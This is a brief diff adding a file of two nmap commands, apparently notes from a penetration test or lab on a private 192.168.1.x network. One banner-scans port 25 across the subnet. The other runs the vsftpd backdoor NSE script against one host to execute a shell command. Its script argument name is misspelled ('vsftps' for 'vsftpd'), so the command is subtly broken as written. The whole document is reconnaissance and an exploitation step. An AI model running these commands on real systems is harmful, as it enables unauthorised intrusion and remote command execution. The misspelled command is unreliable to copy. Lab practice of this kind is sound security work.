@@ -1,0 +1,6 @@
+nmap 192.168.1.0/24 -p 25 --script banner.nse
+
+
+nmap --script ftp-vsftpd-backdoor.nse --script-args ftp-vsftps-backdoor.cmd="ls" 192.168.1.6
+
+
